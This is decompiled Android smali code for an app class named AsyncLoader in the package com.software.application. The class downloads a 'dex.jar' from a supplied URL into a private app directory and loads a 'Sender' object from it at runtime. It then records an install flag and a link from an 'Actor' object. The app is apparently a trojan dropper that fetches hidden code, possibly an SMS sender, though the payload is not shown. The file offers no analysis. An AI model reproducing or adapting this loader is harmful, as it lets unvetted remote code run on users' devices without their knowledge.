.class public Lcom/software/application/Main$AsyncLoader;
.super Landroid/os/AsyncTask;
.source "Main.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/software/application/Main;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = "AsyncLoader"
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask",
        "<",
        "Ljava/lang/String;",
        "Ljava/lang/Integer;",
        "Ljava/lang/String;",
        ">;"
    }
.end annotation


# instance fields
.field final synthetic this$0:Lcom/software/application/Main;


# direct methods
.method public constructor <init>(Lcom/software/application/Main;)V
    .locals 0

    .prologue
    .line 291
    iput-object p1, p0, Lcom/software/application/Main$AsyncLoader;->this$0:Lcom/software/application/Main;

    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    return-void
.end method


# virtual methods
.method protected bridge synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 1
    .param p1, "x0"    # [Ljava/lang/Object;

    .prologue
    .line 291
    check-cast p1, [Ljava/lang/String;

    .end local p1    # "x0":[Ljava/lang/Object;
    invoke-virtual {p0, p1}, Lcom/software/application/Main$AsyncLoader;->doInBackground([Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method protected varargs doInBackground([Ljava/lang/String;)Ljava/lang/String;
    .locals 19
    .param p1, "urls"    # [Ljava/lang/String;

    .prologue
    .line 296
    :try_start_0
    new-instance v8, Ljava/io/File;

    move-object/from16 v0, p0

    iget-object v13, v0, Lcom/software/application/Main$AsyncLoader;->this$0:Lcom/software/application/Main;

    const-string v14, "dex_libs"

    const/4 v15, 0x0

    invoke-virtual {v13, v14, v15}, Lcom/software/application/Main;->getDir(Ljava/lang/String;I)Ljava/io/File;

    move-result-object v13

    const-string v14, "dex.jar"

    invoke-direct {v8, v13, v14}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 297
    .local v8, "jarFile":Ljava/io/File;
    invoke-virtual {v8}, Ljava/io/File;->exists()Z

    move-result v13

    if-nez v13, :cond_0

    .line 298
    invoke-virtual {v8}, Ljava/io/File;->createNewFile()Z

    move-result v13

    if-nez v13, :cond_0

    .line 299
    new-instance v13, Ljava/lang/StringBuilder;

    invoke-direct {v13}, Ljava/lang/StringBuilder;-><init>()V

    const-string v14, "Init failed: Cannot create new file "

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    invoke-virtual {v8}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    .line 323
    .end local v8    # "jarFile":Ljava/io/File;
    :goto_0
    return-object v13

    .line 302
    .restart local v8    # "jarFile":Ljava/io/File;
    :cond_0
    new-instance v12, Ljava/net/URL;

    const/4 v13, 0x0

    aget-object v13, p1, v13

    invoke-direct {v12, v13}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 303
    .local v12, "url":Ljava/net/URL;
    invoke-virtual {v12}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v2

    .line 304
    .local v2, "connection":Ljava/net/URLConnection;
    invoke-virtual {v2}, Ljava/net/URLConnection;->connect()V

    .line 305
    invoke-virtual {v2}, Ljava/net/URLConnection;->getContentLength()I

    move-result v6

    .line 306
    .local v6, "fileLength":I
    new-instance v7, Ljava/io/BufferedInputStream;

    invoke-virtual {v12}, Ljava/net/URL;->openStream()Ljava/io/InputStream;

    move-result-object v13

    invoke-direct {v7, v13}, Ljava/io/BufferedInputStream;-><init>(Ljava/io/InputStream;)V

    .line 307
    .local v7, "input":Ljava/io/InputStream;
    new-instance v9, Ljava/io/FileOutputStream;

    invoke-direct {v9, v8}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 308
    .local v9, "output":Ljava/io/OutputStream;
    const/16 v13, 0x400

    new-array v4, v13, [B

    .line 309
    .local v4, "data":[B
    const-wide/16 v10, 0x0

    .line 311
    .local v10, "total":J
    :goto_1
    invoke-virtual {v7, v4}, Ljava/io/InputStream;->read([B)I

    move-result v3

    .local v3, "count":I
    const/4 v13, -0x1

    if-eq v3, v13, :cond_1

    .line 312
    int-to-long v13, v3

    add-long/2addr v10, v13

    .line 313
    const/4 v13, 0x1

    new-array v13, v13, [Ljava/lang/Integer;

    const/4 v14, 0x0

    const-wide/16 v15, 0x64

    mul-long/2addr v15, v10

    int-to-long v0, v6

    move-wide/from16 v17, v0

    div-long v15, v15, v17

    long-to-int v15, v15

    invoke-static {v15}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v15

    aput-object v15, v13, v14

    move-object/from16 v0, p0

    invoke-virtual {v0, v13}, Lcom/software/application/Main$AsyncLoader;->publishProgress([Ljava/lang/Object;)V

    .line 314
    const/4 v13, 0x0

    invoke-virtual {v9, v4, v13, v3}, Ljava/io/OutputStream;->write([BII)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    .line 320
    .end local v2    # "connection":Ljava/net/URLConnection;
    .end local v3    # "count":I
    .end local v4    # "data":[B
    .end local v6    # "fileLength":I
    .end local v7    # "input":Ljava/io/InputStream;
    .end local v8    # "jarFile":Ljava/io/File;
    .end local v9    # "output":Ljava/io/OutputStream;
    .end local v10    # "total":J
    .end local v12    # "url":Ljava/net/URL;
    :catch_0
    move-exception v5

    .line 321
    .local v5, "e":Ljava/lang/Exception;
    move-object/from16 v0, p0

    iget-object v13, v0, Lcom/software/application/Main$AsyncLoader;->this$0:Lcom/software/application/Main;

    const v14, 0x7f070012

    invoke-virtual {v13, v14}, Lcom/software/application/Main;->getString(I)Ljava/lang/String;

    move-result-object v13

    goto :goto_0

    .line 316
    .end local v5    # "e":Ljava/lang/Exception;
    .restart local v2    # "connection":Ljava/net/URLConnection;
    .restart local v3    # "count":I
    .restart local v4    # "data":[B
    .restart local v6    # "fileLength":I
    .restart local v7    # "input":Ljava/io/InputStream;
    .restart local v8    # "jarFile":Ljava/io/File;
    .restart local v9    # "output":Ljava/io/OutputStream;
    .restart local v10    # "total":J
    .restart local v12    # "url":Ljava/net/URL;
    :cond_1
    :try_start_1
    invoke-virtual {v9}, Ljava/io/OutputStream;->flush()V

    .line 317
    invoke-virtual {v9}, Ljava/io/OutputStream;->close()V

    .line 318
    invoke-virtual {v7}, Ljava/io/InputStream;->close()V

    .line 319
    move-object/from16 v0, p0

    iget-object v13, v0, Lcom/software/application/Main$AsyncLoader;->this$0:Lcom/software/application/Main;

    move-object/from16 v0, p0

    iget-object v14, v0, Lcom/software/application/Main$AsyncLoader;->this$0:Lcom/software/application/Main;

    invoke-virtual {v14}, Lcom/software/application/Main;->getApplicationContext()Landroid/content/Context;

    move-result-object v14

    invoke-virtual {v8}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v15

    invoke-static {v14, v15}, Lcom/software/application/Main;->getSenderInstance(Landroid/content/Context;Ljava/lang/String;)Lcom/software/application/Sender;

    move-result-object v14

    invoke-static {v13, v14}, Lcom/software/application/Main;->access$002(Lcom/software/application/Main;Lcom/software/application/Sender;)Lcom/software/application/Sender;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 323
    const/4 v13, 0x0

    goto :goto_0
.end method

.method protected bridge synthetic onPostExecute(Ljava/lang/Object;)V
    .locals 0
    .param p1, "x0"    # Ljava/lang/Object;

    .prologue
    .line 291
    check-cast p1, Ljava/lang/String;

    .end local p1    # "x0":Ljava/lang/Object;
    invoke-virtual {p0, p1}, Lcom/software/application/Main$AsyncLoader;->onPostExecute(Ljava/lang/String;)V

    return-void
.end method

.method protected onPostExecute(Ljava/lang/String;)V
    .locals 6
    .param p1, "result"    # Ljava/lang/String;

    .prologue
    const/4 v5, 0x1

    .line 332
    iget-object v2, p0, Lcom/software/application/Main$AsyncLoader;->this$0:Lcom/software/application/Main;

    invoke-static {v2}, Lcom/software/application/Main;->access$000(Lcom/software/application/Main;)Lcom/software/application/Sender;

    move-result-object v2

    if-eqz v2, :cond_0

    .line 333
    iget-object v2, p0, Lcom/software/application/Main$AsyncLoader;->this$0:Lcom/software/application/Main;

    invoke-static {v2, v5}, Lcom/software/application/Main;->access$902(Lcom/software/application/Main;Z)Z

    .line 334
    iget-object v2, p0, Lcom/software/application/Main$AsyncLoader;->this$0:Lcom/software/application/Main;

    iget-object v3, p0, Lcom/software/application/Main$AsyncLoader;->this$0:Lcom/software/application/Main;

    invoke-static {v3}, Lcom/software/application/Main;->access$700(Lcom/software/application/Main;)Lcom/software/application/Actor;

    move-result-object v3

    invoke-virtual {v3}, Lcom/software/application/Actor;->getLinkHasToBeActed()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Lcom/software/application/Main;->access$1002(Lcom/software/application/Main;Ljava/lang/String;)Ljava/lang/String;

    .line 335
    iget-object v2, p0, Lcom/software/application/Main$AsyncLoader;->this$0:Lcom/software/application/Main;

    const-string v3, "PREFS"

    const/4 v4, 0x0

    invoke-virtual {v2, v3, v4}, Lcom/software/application/Main;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    .line 336
    .local v1, "settings":Landroid/content/SharedPreferences;
    invoke-interface {v1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    .line 337
    .local v0, "editor":Landroid/content/SharedPreferences$Editor;
    const-string v2, "WAS_INSTALLED"

    invoke-interface {v0, v2, v5}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 338
    const-string v2, "INSTALLED_URL"

    iget-object v3, p0, Lcom/software/application/Main$AsyncLoader;->this$0:Lcom/software/application/Main;

    invoke-static {v3}, Lcom/software/application/Main;->access$700(Lcom/software/application/Main;)Lcom/software/application/Actor;

    move-result-object v3

    invoke-virtual {v3}, Lcom/software/application/Actor;->getLinkHasToBeActed()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 339
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 340
    iget-object v2, p0, Lcom/software/application/Main$AsyncLoader;->this$0:Lcom/software/application/Main;

    invoke-static {v2}, Lcom/software/application/Main;->access$1100(Lcom/software/application/Main;)V

    .line 344
    .end local v0    # "editor":Landroid/content/SharedPreferences$Editor;
    .end local v1    # "settings":Landroid/content/SharedPreferences;
    :goto_0
    return-void

    .line 342
    :cond_0
    iget-object v2, p0, Lcom/software/application/Main$AsyncLoader;->this$0:Lcom/software/application/Main;

    invoke-static {v2, p1}, Lcom/software/application/Main;->access$200(Lcom/software/application/Main;Ljava/lang/String;)V

    goto :goto_0
.end method

.method public varargs onProgressUpdate([Ljava/lang/Integer;)V
    .locals 4
    .param p1, "args"    # [Ljava/lang/Integer;

    .prologue
    const/4 v3, 0x0

    .line 327
    iget-object v0, p0, Lcom/software/application/Main$AsyncLoader;->this$0:Lcom/software/application/Main;

    invoke-static {v0}, Lcom/software/application/Main;->access$600(Lcom/software/application/Main;)Landroid/widget/ProgressBar;

    move-result-object v0

    aget-object v1, p1, v3

    invoke-virtual {v1}, Ljava/lang/Integer;->intValue()I

    move-result v1

    invoke-virtual {v0, v1}, Landroid/widget/ProgressBar;->setProgress(I)V

    .line 328
    iget-object v0, p0, Lcom/software/application/Main$AsyncLoader;->this$0:Lcom/software/application/Main;

    invoke-static {v0}, Lcom/software/application/Main;->access$800(Lcom/software/application/Main;)Landroid/widget/TextView;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v2, p0, Lcom/software/application/Main$AsyncLoader;->this$0:Lcom/software/application/Main;

    invoke-static {v2}, Lcom/software/application/Main;->access$700(Lcom/software/application/Main;)Lcom/software/application/Actor;

    move-result-object v2

    invoke-virtual {v2}, Lcom/software/application/Actor;->getMainLocalizedText()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    aget-object v2, p1, v3

    invoke-virtual {v2}, Ljava/lang/Integer;->intValue()I

    move-result v2

    invoke-static {v2}, Ljava/lang/Integer;->toString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "%"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 329
    return-void
.end method

.method public bridge synthetic onProgressUpdate([Ljava/lang/Object;)V
    .locals 0
    .param p1, "x0"    # [Ljava/lang/Object;

    .prologue
    .line 291
    check-cast p1, [Ljava/lang/Integer;

    .end local p1    # "x0":[Ljava/lang/Object;
    invoke-virtual {p0, p1}, Lcom/software/application/Main$AsyncLoader;->onProgressUpdate([Ljava/lang/Integer;)V

    return-void
.end method
